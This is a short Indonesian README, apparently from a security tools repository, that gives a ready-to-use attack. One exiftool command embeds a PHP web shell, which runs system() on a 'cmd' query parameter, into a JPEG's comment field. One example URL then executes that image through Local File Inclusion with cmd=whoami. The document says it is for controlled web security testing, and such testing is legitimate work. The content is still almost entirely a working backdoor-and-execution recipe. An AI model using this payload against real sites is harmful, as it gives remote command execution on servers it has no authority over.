# Stego PHP Payload
Steganografi untuk menyisipkan payload PHP dalam file gambar, digunakan untuk pengujian keamanan web di lingkungan terkontrol. 

# Payload

```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' kucing.jpg -o shell.jpg
```

# Eksekusi
Eksekusi backdoor gambar ke Local File Inclusion :

```
https://example.com/index.php?page=uploads/shell.jpg&cmd=whoami
```


